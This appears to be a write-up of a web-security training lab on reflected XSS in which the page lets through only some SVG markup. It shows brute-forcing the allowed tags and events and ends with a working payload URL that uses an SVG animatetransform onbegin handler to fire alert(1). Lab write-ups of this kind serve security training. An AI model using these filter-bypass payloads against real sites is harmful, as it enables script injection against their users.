# Lab: Reflected XSS with some SVG markup allowed #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/10b740a5-127d-4fee-b761-a9770a8968f3)

> We first inject a standard xss payload `<img src=1 onerror=alert(1)>`

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/f42631ec-e630-4707-9bc9-2fc2c12ed4a2)

> So we bruteforce to find the supporting tag

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/a2cde76a-4bff-4082-b320-cd028ea54d7e)

>  When the attack is finished, review the results. Observe that all payloads caused an HTTP 400 response,
 except for the ones using the <svg>, <animatetransform>, <title>,and <image> tags, which received a 200 response.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/9e82c971-7dc8-4786-919e-77d85eb9aa13)

> Now replace the place with <svg><animatetransform%20=1> try to find the event which can be used.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/e6a326ad-fc5d-48a1-befb-443d75815760)

> When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response,
  except for the onbegin payload, which caused a 200 response.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/d797666d-21dd-4359-9155-28b4aef8f506)

> Now we construct change the url

```
    https://0ade001d04fc94538174d01b00350002.h1-web-security-academy.net//?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
> We got alert message

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/90988c32-2154-49a4-9690-3fe874239198)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/aafec70a-0354-4865-ac2f-cec50b8a47f3)

